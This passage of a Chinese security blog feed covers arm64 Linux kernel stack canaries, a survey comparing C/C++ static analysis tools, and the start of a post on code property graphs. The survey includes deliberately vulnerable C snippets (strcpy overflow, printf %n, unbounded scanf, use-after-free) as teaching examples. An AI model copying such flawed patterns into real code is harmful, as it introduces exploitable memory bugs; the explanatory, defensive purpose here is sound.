获取一个半随机数 */</span></span><br><span class="line">    canary ^= LINUX_VERSION_CODE;</span><br><span class="line">    canary &amp;= CANARY_MASK;</span><br><span class="line">    current-&gt;stack_canary = canary;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (!IS_ENABLED(CONFIG_STACKPROTECTOR_PER_TASK))        </span><br><span class="line">        __stack_chk_guard = current-&gt;stack_canary;    <span class="comment">/* 如果没指定 per thread,则初始化全局canary */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        .......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">./kernel/panic.c</span><br><span class="line">__visible noinstr <span class="type">void</span> __stack_chk_fail(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    instrumentation_begin();</span><br><span class="line">    panic(<span class="string">&quot;stack-protector: Kernel stack is corrupted in: %pB&quot;</span>,</span><br><span class="line">        __builtin_return_address(<span class="number">0</span>));</span><br><span class="line">    instrumentation_end();</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__stack_chk_fail);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2per-task-canary的实现">2.per-task canary的实现</h4><p>CONFIG_STACKPROTECTOR =y<br>CONFIG_STACKPROTECTOR_STRONG =y<br>CONFIG_STACKPROTECTOR_PER_TASK=y<br>per-task canary时内核除了初始化外还需要负责为每个进程生成随机的canary，并负责在进程切换时同步per-cpu的寄存器与进程的关系，此时内核新增的配置项和数据结构如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">./arch/arm64/kernel/<span class="keyword">asm</span>-offsets.c</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STACKPROTECTOR</span></span><br><span class="line">  <span class="built_in">DEFINE</span>(TSK_STACK_CANARY,    <span class="built_in">offsetof</span>(<span class="keyword">struct</span> task_struct, stack_canary));        <span class="comment">/* task_struct中增加per thread的canary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">./arch/arm64/Kconfig</span><br><span class="line">config STACKPROTECTOR_PER_TASK</span><br><span class="line">    def_bool y</span><br><span class="line">    depends on STACKPROTECTOR &amp;&amp; CC_HAVE_STACKPROTECTOR_SYSREG</span><br><span class="line"></span><br><span class="line">./arch/arm64/<span class="function">Makefile</span></span><br><span class="line"><span class="function"><span class="title">ifeq</span> <span class="params">($(CONFIG_STACKPROTECTOR_PER_TASK),y)</span></span></span><br><span class="line"><span class="function">prepare: stack_protector_prepare</span></span><br><span class="line"><span class="function">/* 增加编译选项 -mstack-protector-guard=</span>sysreg -mstack-protector-guard-reg=sp_el0 -mstack-protector-guard-offset=TSK_STACK_CANARY*/</span><br><span class="line">stack_protector_prepare: prepare0                                             </span><br><span class="line">    $(eval KBUILD_CFLAGS += -mstack-protector-guard=sysreg          \        #<span class="meta"># per-task编译选项支持</span></span><br><span class="line">                -mstack-protector-guard-reg=sp_el0      \</span><br><span class="line">                -mstack-protector-guard-offset=$(shell      \</span><br><span class="line">            awk <span class="string">&#x27;&#123;if ($$2 == &quot;TSK_STACK_CANARY&quot;) print $$3;&#125;&#x27;</span> \</span><br><span class="line">                    include/generated/<span class="keyword">asm</span>-offsets.h))</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>根据编译选项可知，per-task模式下内核指定编译器通过 *(sp_el0 + TSK_STACK_CANARY) 来解引用per-cpu canary, sp_el0在内核中用来存储当前进程task_struct的指针，即对于内核来说对 *(sp_el0 + TSK_STACK_CANARY) 的解引用即相当于访问 current-&gt;stack_canary.</p><p>由于sp_el0在内核中是随着进程切换而切换的(见__switch_to)，故stack canary特性并不需要做额外的操作，其只需要在每个线程创建时为其生成新的canary即可:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">task_struct</span> *<span class="built_in">dup_task_struct</span>(<span class="keyword">struct</span> task_struct *orig, <span class="type">int</span> node)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STACKPROTECTOR                        <span class="comment">/* 这里不是CONFIG_STACKPROTECTOR_PER_TASK是因为x86平台此特性兼容的历史原因，这里欠缺一点优雅 */</span></span></span><br><span class="line">    tsk-&gt;stack_canary = <span class="built_in">get_random_canary</span>();        <span class="comment">/* fork线程时总是新生成一个随机数作为新线程的canary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故在aarch64内核中 per-task canary的思路可整理如下:</p><ul><li>内核自身sp_el0记录task_struct(即current)地址，并随进程切换而切换</li><li>在task_struct中增加一个成员stack_canary, 则此成员总是可以通过 (sp_el0 + TSK_STACK_CANARY)找到<br>进程创建时总是为其生成一个新的canary记录到 current-&gt;stack_canary</li><li>编译器开启per-cpu canary支持，基准的canary值总是来自sp_el0 + TSK_STACK_CANARY，也就是 current-&gt;stack_canary</li></ul><p><a href="https://blog.csdn.net/lidan113lidan/article/details/120318707">(69条消息) linux 内核安全增强(一)— stack canary_ashimida@的博客-CSDN博客___stack_chk_guard</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码静态分析工具调研</title>
      <link href="/2023/12/18/Security/software%20security/%E4%BB%A3%E7%A0%81%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/12/18/Security/software%20security/%E4%BB%A3%E7%A0%81%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/92886d979401">C/C++代码静态分析工具调研 - 简书 (jianshu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/367641334">干货|代码安全审计权威指南（附下载地址） - 知乎 (zhihu.com)</a></p><p><a href="https://zhengtianzuo.blog.csdn.net/article/details/122679768">C++代码静态分析与优化_专栏总目录_devskim-CSDN博客</a></p><h1 id="简述">简述</h1><p>静态分析（static analysis）是指在不执行代码的情况下对其进行分析评估的过程，是软件质量和软件安全保障的重要一环。它通过词法分析、语义分析、控制流分析、数据流分析等技术对代码逐行解析暴露问题，从而协助我们将许多在运行时才会暴露的棘手麻烦扼杀于摇篮之中。</p><h1 id="典型问题示例">典型问题示例</h1><p>代码静态分析能够识别诸多类型的漏洞或缺陷，轻至警告级的「变量未使用」，重至错误级的各类bug，这里列举几种常见的、较严重的、可静态检测的问题。</p><h4 id="缓冲区溢出">■ 缓冲区溢出</h4><p>缓冲区溢出是指向缓冲区中存入超出其空间大小的数据量，导致多余的数据覆盖其他区域的合法数据，类似倒入容器中的水过多而导致溢出，流到它不该去的地方，造成不可预期的后果。从实践统计看，缓冲区溢出问题是软件中最普遍存在的漏洞问题，在C/C++这类不提供内存越界检测的语言中尤甚。通常，发生缓冲区溢出的情况有：</p><ul><li>字符串拷贝，当目标缓冲区长度小于源字串的长度时（此类的函数包括<code>strcpy</code>、<code>_mbscpy</code>、<code>strcat</code>、<code>wcscat</code>、<code>memcpy</code>、<code>strncpy</code>、<code>_mbsncpy</code>、<code>strncat</code>、<code>wcsncat</code>等）。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串拷贝之前没有对s做长度判断，如果超过10，就会造成缓冲区溢出。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">char</span>* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>格式化字符串处理，当参数与格式化字符串不匹配时（此类的函数包括<code>printf</code>、<code>fprintf</code>、<code>sprintf</code>、<code>swprintf</code>等）。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// %n将前面打印的字串长度信息写到相应地址</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span><br><span class="line">printf(<span class="string">&quot;This is a test string.%n&quot;</span>, &amp;<span class="built_in">len</span>);</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的写法，此时长度信息会写到地址为0的内存空间中</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span><br><span class="line">printf(<span class="string">&quot;This is a test string.%n&quot;</span>, <span class="built_in">len</span>);</span><br></pre></td></tr></table></figure><ul><li>字符串读取，当缓冲区小于所要读入的字符串长度时（此类的函数包括<code>scanf</code>、<code>fscanf</code>、<code>sscanf</code>、<code>gets</code>、<code>getc</code>、<code>fgets</code>、<code>fgetc</code>等）。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户输入的字串长度不受控制，如果超过10，就会造成缓冲区溢出。</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;buf);</span><br></pre></td></tr></table></figure><h4 id="内存泄漏">■ 内存泄漏</h4><p>内存泄漏一般指堆内存的泄漏（也有系统资源的泄漏），程序申请的内存资源没有被合理地释放，导致这部分内存不能被回收利用而造成资源的浪费。严重时，过多的内存泄漏会造成系统崩溃。C/C++语言没有自动回收机制，需要程序员自行确保内存使用的闭环（<code>new/delete</code>、<code>alloc/free</code>、<code>malloc/free</code>、<code>GlobalAlloc/GlobalFree</code>成对使用）。</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-311849d814d36878.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/318/format/webp" alt="img"></p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-afcd25b4580f01aa.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/318/format/webp" alt="img"></p><p>通常，发生内存泄漏的情况有：</p><ul><li>分配内存后忘了调用相应的释放函数。</li><li>过程因达到某种条件提前结束，未能执行后面的内存释放函数。</li><li>程序设计不合理，不断分配内存，到最后才一起释放，虽然整体上不算内存泄漏，但在过程中已经酝酿了资源耗尽的可能性，无异于内存泄漏。</li></ul><h4 id="野指针">■ 野指针</h4><p>当指针变量未被初始化，或指向的内存已被回收时，该指针便成了野指针。其指向的内存地址是非法的，对这块非法区域进行操作将导致不可预料的后果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对指针是否为空的判断看是严谨，其实是无效的。</span></span><br><span class="line"><span class="type">char</span> *p = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(p, <span class="string">&quot;danger&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="工具调研">工具调研</h1><p>根据工作需要，从可检测的语言、使用平台和授权三方面考量，调研了20余种主流的C/C++代码静态分析工具。</p><table><thead><tr><th>工具</th><th>语言</th><th>平台</th><th>授权</th></tr></thead><tbody><tr><td><a href="http://adlint.sourceforge.net/">AdLint</a></td><td>C</td><td>Windows, Linux, Mac OS, FreeBSD</td><td>开源</td></tr><tr><td><a href="https://www.absint.com/astree/index.htm">Astrée</a></td><td>C</td><td>Windows, Linux</td><td>付费</td></tr><tr><td><a href="http://www.iste.uni-stuttgart.de/en/ps/project-bauhaus.html">Bauhaus Toolkit</a></td><td>C, C++, Java, C#, Ada</td><td>Windows, Linux, Solaris</td><td>付费</td></tr><tr><td><a href="https://forge.ispras.ru/projects/blast">BLAST</a></td><td>C</td><td>Linux</td><td>开源</td></tr><tr><td><a href="http://cppcheck.sourceforge.net/">Cppcheck</a></td><td>C, C++</td><td>Windows, Linux</td><td>开源</td></tr><tr><td><a href="http://coccinelle.lip6.fr/">Coccinelle</a></td><td>C</td><td>Linux</td><td>开源</td></tr><tr><td><a href="https://www.synopsys.com/software-integrity/resources/datasheets/coverity.html">Coverity</a></td><td>C, C++, C#, Java, JS, PHP, Python, Objective-C, Ruby, Swift, Fortran, VB</td><td>Windows, Linux, Mac OS, FreeBSD, Solaris</td><td>付费</td></tr><tr><td><a href="https://www.cppdepend.com/">CppDepend</a></td><td>C, C++</td><td>Windows, Linux</td><td>付费</td></tr><tr><td><a href="http://www.bugseng.com/eclair">ECLAIR</a></td><td>C, C++</td><td>Windows, Linux, Mac OS</td><td>付费</td></tr><tr><td><a href="https://www.dwheeler.com/flawfinder/">Flawfinder</a></td><td>C, C++</td><td>Python</td><td>开源</td></tr><tr><td><a href="http://www.lix.polytechnique.fr/Labo/Sylvie.Putot/fluctuat.html">Fluctuat</a></td><td>C, Ada</td><td>Windows, Linux, Mac OS, FreeBSD</td><td>付费</td></tr><tr><td><a href="http://frama-c.com/">Frama-C</a></td><td>C</td><td>Windows, Linux, Mac OS, FreeBSD</td><td>开源/付费</td></tr><tr><td><a href="https://www.grammatech.com/products/codesonar">CodeSonar</a></td><td>C, C++, Java, 二进制码</td><td>Windows, Linux, Mac OS, FreeBSD</td><td>付费</td></tr><tr><td><a href="https://www.klocwork.com/">Klocwork</a></td><td>C, C++, Java, C#</td><td>Windows, Linux, Solaris</td><td>付费</td></tr><tr><td><a href="https://ldra.com/industrial-energy/products/ldra-testbed-tbvision/">LDRA Testbed</a></td><td>C, C++, Java, Ada</td><td>Windows, Linux, Mac OS</td><td>付费</td></tr><tr><td><a href="https://www.parasoft.com/products/ctest">Parasoft C/C++test</a></td><td>C, C++</td><td>Windows, Linux, Solaris</td><td>付费</td></tr><tr><td><a href="http://www.gimpel.com/html/pcl.htm">PC-Lint</a></td><td>C, C++</td><td>Windows</td><td>付费</td></tr><tr><td><a href="https://cn.mathworks.com/products/polyspace.html">Polyspace</a></td><td>C, C++, Ada</td><td>Windows, Linux, Mac OS</td><td>付费</td></tr><tr><td><a href="http://www.prqa.com/static-analysis-software/qac-qacpp-static-analyzers/">PRQA QA·Static Analyzers</a></td><td>C, C++, Java</td><td>Windows, Linux</td><td>付费</td></tr><tr><td><a href="https://www.microsoft.com/en-us/research/project/slam/?from=http%3A%2F%2Fresearch.microsoft.com%2Fslam">SLAM</a></td><td>C</td><td>Windows</td><td>免费</td></tr><tr><td><a href="https://sparse.wiki.kernel.org/index.php/Main_Page">Sparse</a></td><td>C</td><td>Linux, Mac OS, BSD</td><td>开源</td></tr><tr><td><a href="http://lclint.cs.virginia.edu/">Splint</a></td><td>C</td><td>Linux, FreeBSD, Solaris</td><td>开源</td></tr><tr><td><a href="http://code.tencent.com/tscancode.html">TscanCode</a></td><td>C, C++, C#, Lua</td><td>Windows, Linux, Mac OS</td><td>开源</td></tr></tbody></table><p>根据以下标准，筛选出3款适用性较高的工具——Cppcheck、Flawfinder、TscanCode——进行详细调研：</p><ul><li>语言：支持C/C++代码分析</li><li>平台：支持在Windows和/或Linux平台运行</li><li>授权：免费</li></ul><p>为进行一次实践对比，从TscanCode的GitHub上抓到一组现成的C/C++编码问题示例，共94个CPP文件，考察三者的检测效果。</p><blockquote><p>运行平台：Windows<br>被测语言：C/C++<br>测试集：<a href="https://github.com/Tencent/TscanCode/tree/master/samples/cpp">TscanCode/samples/cpp</a></p></blockquote><h4 id="cppcheck">■ <a href="http://cppcheck.sourceforge.net/">Cppcheck</a></h4><blockquote><p>Cppcheck可检测的问题包括：</p><ul><li>Dead pointers</li><li>Division by zero</li><li>Integer overflows</li><li>Invalid bit shift operands</li><li>Invalid conversions</li><li>Invalid usage of STL</li><li>Memory management</li><li>Null pointer dereferences</li><li>Out of bounds checking</li><li>Uninitialized variables</li><li>Writing const data</li></ul><p>并将问题分为以下6类：</p><ul><li><strong>错误（error）</strong>：bug。</li><li><strong>警告（warning）</strong>：预防性编程方面的建议。</li><li><strong>风格警告（style）</strong>：出于对代码简洁性的考虑（函数未使用、冗余代码等）。</li><li><strong>可移植性警告（portability）</strong>：64/32位可移植性、编译器通用性等。</li><li><strong>性能警告（performance）</strong>：使代码更高效的建议，但不保证一定有明显效果。</li><li><strong>信息消息（information）</strong>：条件编译方面的警告。</li></ul></blockquote><p>安装十分简便，只需在官网下载最新的可执行安装包（本文目前为<code>cppcheck-1.83-x86-Setup.msi</code>）跟着向导「下一步」即可。</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-7e2c0428206a5133.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/816/format/webp" alt="img"></p><p>Cppcheck有GUI，选择菜单栏「Analyze」下的「文件」或「目录」即可对源代码进行静态分析。</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-69215d004372d570.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>运行结果对94个例子的分析十分到位，只不过底侧的代码预览对中文注释似乎不太友好。</p><p>除了GUI，Cppcheck还支持与多种IDE（如VS、Eclipse、QtCreator等）、版本管理系统（如Tortoise SVN、Git）集成使用。</p><p>可对每次分析进行配置甚至自定义规则，并作为项目文件进行保存或重载。</p><p>分析的结果报告可保存为格式化纯文本或XML，并可借助Python pygments将XML生成为HTML。</p><h4 id="tscancode">■ <a href="http://code.tencent.com/tscancode.html">TscanCode</a></h4><p>TscanCode是腾讯的开源项目，为此次调研的唯一一款本土工具，起初构建于Cppcheck的基础之上，后来进行了重新实现，并加入了对C#和Lua的支持。</p><blockquote><p>TscanCode可检测的问题包括：</p><ul><li>空指针检查，包含可疑的空指针，判空后解引用比如Crash等共3类subid检查</li><li>数据越界，Sprintf_S越界共1类subid检查</li><li>内存泄漏，分配和释放不匹配同1类subid检查</li><li>逻辑错误，重复的代码分支，bool类型和INT进行比较，表达式永远True或者false等共18类检查</li><li>可疑代码检查，if判断中含有可疑的=号，自由变量返回局部变量等共计15类检查</li><li>运算错误，判断无符号数小于0,对bool类型进行++自增等，共计11类检查</li></ul><p>并将问题分为<strong>致命</strong>、<strong>严重</strong>、<strong>警告</strong>、<strong>提示</strong>、<strong>风格</strong>5类。</p></blockquote><p>安装同样便捷，下载安装包（本文目前为<code>TscanCodeV2.14.24.windows.exe</code>）跟着向导「下一步」即可。</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-7833720f633ac65b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp" alt="img"></p><p>同样具有用户友好的GUI，且UI设计更时尚些。点击「扫描文件夹」或「扫描文件」选定路径后点击「开始扫描」即可使用。</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-bf4a49679a1f362a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>扫描结果，对中文注释必然友好。</p><p>TscanCode的提示信息可以说直接照搬了Cppcheck，但给出的提示数量明显少于Cppcheck，以<code>mismatchsize.cpp</code>为例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分配的内存空间不匹配</span></span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">malloc</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https:////upload-images.jianshu.io/upload_images/30022-387ab0daf9e25b64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658/format/webp" alt="img"></p><p>Cppcheck对mismatchsize.cpp的检测结果有4条提示，TscanCode相应地只给出了后两条。</p><h4 id="flawfinder">■ <a href="https://www.dwheeler.com/flawfinder/">Flawfinder</a></h4><p>Flawfinder由计算机安全专家<a href="https://www.dwheeler.com/">David A. Wheeler</a>个人开发，依托于Python，自然而然拥有了跨平台性。</p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flawfinder</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> *python_path*/Scripts</span><br><span class="line">python flawfinder *directory_with_source_code*</span><br></pre></td></tr></table></figure><p>实践表明，Flawfinder对中文注释更不友好，直接拿TscanCode的测试集跑会报编码错误，尽管这些CPP文件本来就是Flawfinder文档所建议的UTF-8格式：</p><blockquote><p>UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xaf in position 92: illegal multibyte sequence</p></blockquote><p>将测试集批量转换为ANSI格式后方可正常运行：</p><p><img src="https:////upload-images.jianshu.io/upload_images/30022-314cdadac2240642.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/677/format/webp" alt="img"></p><p>94个示例，仅检测出11个问题。</p><p>David A. Wheeler本人也在官网特别声明Flawfinder是款相对简单的静态分析工具，不进行数据流和控制流分析，甚至不识别函数的参数类型。</p><p>Flawfinder可将结果保存为<a href="https://www.dwheeler.com/flawfinder/correct-results.txt">格式化纯文本</a>、<a href="https://www.dwheeler.com/flawfinder/correct-results.html">HTML</a>和<a href="https://www.dwheeler.com/flawfinder/correct-results.csv">CSV</a>三种格式。</p><h4 id="3款工具对比">3款工具对比</h4><ul><li>检测能力：Cppcheck &gt; TscanCode &gt; Flawfinder</li><li>友好度：TscanCode &gt; Cppcheck &gt; Flawfinder</li><li>易用性：TscanCode &gt; Cppcheck &gt; Flawfinder</li></ul><h1 id="参考文献">参考文献</h1><ul><li>向东, 刘海燕. C/C++静态代码安全检查工具研究[J]. 计算机工程与设计, 2005, 26(8):2110-2112.</li><li>罗琴灵. 基于静态检测的代码审计技术研究[J]. 2016.</li><li><a href="https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis#C,_C++">List of tools for static code analysis - Wikipedia</a></li><li><a href="https://blog.csdn.net/wetest_tencent/article/details/51516347">C++代码质量扫描主流工具深度比较 - CSDN博客</a></li><li><a href="http://qa.blog.163.com/blog/static/190147002201611147530522/">C/C++静态代码检查工具对比分析 - 网易博客</a></li><li><a href="https://blog.csdn.net/liang19890820/article/details/52778149">Cppcheck 用法（上篇） - CSDN博客</a></li><li><a href="http://cppcheck.sourceforge.net/manual.pdf">Cppcheck手册</a></li><li><a href="https://www.dwheeler.com/flawfinder/flawfinder.pdf">Flawfinder文档</a></li></ul><p>作者：逸之<br>链接：<a href="https://www.jianshu.com/p/92886d979401">https://www.jianshu.com/p/92886d979401</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码分析相关图结构</title>
      <link href="/2023/12/18/Security/software%20security/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E5%9B%BE%E7%BB%93%E6%9E%84/"/>
      <url>/2023/12/18/Security/software%20security/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E5%9B%BE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="代码分析属性图-cpg">代码分析属性图 CPG</h1><p>代码分析工具层出不穷，编译器本身也内置了大量的静态检查，但分析的数据源较为单一。而本文要介绍的，是集众之所长的代码分析属性图 CPG，在漏洞分析上很有帮助。</p><h2 id="1-定义">1、定义</h2><p>代码属性图(code property graph，简称 CPG) 是一种数据结构，用来通过 DSL(domain-specific language) 查询语句来挖掘代码漏洞。</p><p>它的主要思想如下：</p><ul><li>CPG 将多个程序表示(program representations)整合成一个</li><li>CPG 数据被存储在图数据库中</li><li>通过 DSL 在图数据库中遍历和查询 CPG 数据</li></ul><h2 id="2-用处">2、用处</h2><p>CPG 整合了 AST(abstract syntax trees)、CFG(control flow graphs)、PDG(program dependence graphs) 到一种数据结构当中。</p><p>这种综合的数据表示，使得我们在图遍历当中，可以优雅地组织漏洞扫描的模版。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217820.png" alt="img"></p><p>可以用来分析缓冲区溢出、整型溢出、格式字符串漏洞、内存泄漏等。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217810.png" alt="img"></p><h2 id="21-局限性">2.1、局限性</h2><p>1、纯静态分析，缺乏对运行时信息的组织(比如数据争用)</p><p>2、解决的是通用的潜在漏洞，难以挖掘特定场景下的漏洞</p><p>3、暂时缺乏对 IR 层面的分析(待扩展)</p><h2 id="3-结构">3、结构</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217817.png" alt="img"></p><p>结合了下面三种不同的表示:</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217814.png" alt="img"></p><p>整合成一种表示 - Code Property Graph:</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217826.png" alt="img"></p><p>CPG 就是属性图，它包含以下组成部分：</p><ul><li>节点及其类型。节点代表程序的组成部分，包含有底层语言的函数、变量、控制结构等，还有更抽象的 HTTP 终端等。每个节点都有一个类型，如类型 <code>METHOD</code> 代表是方法，而 <code>LOCAL</code> 代表是一个局部变量。</li><li>有向边及标签。节点之间的边代表它们之间的关系，而标签则是关系的说明。比如一个方法 <code>CONTAINS</code> 包含了一个局部变量。</li><li>键值对。节点带有键值对，即属性，键取决于节点的类型。比如一个方法至少会有一个方法名和一个签名，而一个局部变量至少有名字和类型。</li></ul><h2 id="4-概念">4、概念</h2><h2 id="41-cpg-code-property-graph">4.1、CPG (Code Property Graph)</h2><h3 id="411-property-graph">4.1.1、property graph</h3><p>定义基本的有向图数据结构 G = (V, E, λ, μ)，即 graph = (点的集合，有向边的集合，边上标签的计算函数，属性)</p><p>Σ 代表字母表，λ : E → Σ</p><p>K 代表属性键 key 的集合，而 S 代表属性值 value 的集合，μ : (V ∪ E) × K → S</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217830.png" alt="img"></p><h3 id="412-traversal">4.1.2、traversal</h3><p>遍历函数是 T : P(V) → P(V)，P 是 V 的幂集，即 V 中所有子集构成的集合，实际上是把一系列节点映射为另一系列的节点。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217072.png" alt="img"></p><p>还可以获取有向边的输入：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217083.png" alt="img"></p><h2 id="42-ast-abstract-syntax-trees">4.2、AST (Abstract Syntax Trees)</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217095.png" alt="img"></p><p>抽象语法树 AST，这棵树的编码信息，表达了语句(statements)和表达式(expressions)是如何嵌套组合来生成程序代码的。</p><p>AST 是有序的树，它的内部节点代表了运算符操作(如加法或赋值)，而叶子节点则关联到操作数(如常量或标识符)。</p><h2 id="43-cfg-control-flow-graph">4.3、CFG (Control Flow Graph)</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217112.png" alt="img"></p><p>控制流图 CFG，描述了代码语句(statements)执行的顺序，以及某一执行路径上的某处的状态。在图中，语句(statements)和判断(predicates)用节点来表示，而这些节点用有向边来连接，表示控制的转换。每条边需要标上 true、false、空 的标签。</p><p>CFG 可以用 AST 来生成：首先，结构化的控制语句(如 if、while、for)先用来构建初始的 CFG；然后，添加上非结构化的控制语句(如 goto、break、continue)，来逐步修正这个初始的 CFG。</p><h2 id="44-pdg-program-dependence-graphs">4.4、PDG (Program Dependence Graphs)</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252217124.png" alt="img"></p><p>PDG 用来找出会影响某条语句上的变量值的所有语句和判断。PDG 展现了语句和判断之间的依赖关系。一般该图以两种类型的边来构造：数据依赖边(data dependency edges)表示会影响某语句的变量；控制依赖边(control dependency edges)表示判断语句对于变量值的影响。</p><p>PDG 的边可以从 CFG 